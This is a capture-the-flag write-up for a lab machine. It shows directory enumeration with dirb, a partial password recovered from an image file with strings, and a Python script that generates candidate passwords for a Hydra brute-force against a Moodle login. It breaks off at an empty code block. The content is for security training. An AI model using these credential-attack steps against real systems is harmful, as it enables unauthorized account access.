Okay, first of all - we do some info gathering. Using nmap says we have an apache httpd server and nothing more. Searching through the website reveals nothing (checking source, running nikto and checking cookies/http headers).
From here I was stuck, so I went to the forum to check for some hints - it seems like there is a corrupted file. Obviously, it should be in /images folder because it contains most of the files. Checking every photo will be time consuming, but this is the only way (or to write a small script).
```
root@kali:~/Downloads# strings 5.png
Hi Servicedesk,
I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
Could you guys figure out what the last charachter is, or just reset it?
Thanks,
Giovanni
```
Now, we should find a login page. I used dirb to run again a common word list and found a few interesting directories, one of them is obviously the primary suspect (as a student, I can't believe I didn't think about it):
```
root@kali:~/Downloads# dirb http://10.10.10.153

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar  5 14:16:34 2019
URL_BASE: http://10.10.10.153/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.153/ ----
==> DIRECTORY: http://10.10.10.153/css/                                                                               
==> DIRECTORY: http://10.10.10.153/fonts/                                                                             
==> DIRECTORY: http://10.10.10.153/images/                                                                            
+ http://10.10.10.153/index.html (CODE:200|SIZE:8028)                                                                 
==> DIRECTORY: http://10.10.10.153/javascript/                                                                        
==> DIRECTORY: http://10.10.10.153/js/                                                                                
==> DIRECTORY: http://10.10.10.153/manual/                                                                            
==> DIRECTORY: http://10.10.10.153/moodle/                                                                            
+ http://10.10.10.153/phpmyadmin (CODE:403|SIZE:297)                                                                  
+ http://10.10.10.153/server-status (CODE:403|SIZE:300) 
```
Now we want to login to Giovanni's user.
we immidiately can see that the teachers name is Giovanni Chhatta therefor it's the login name. Now, we know we have a missing char at the end of the pass, so let's use bruteforce with Hydra to find it quickly. I created a password file with python:
```
import string
password="Th4C00lTheacha"
for x in string.printable:
    print(password+x)
```
and then used it to crack the pass:
```

```

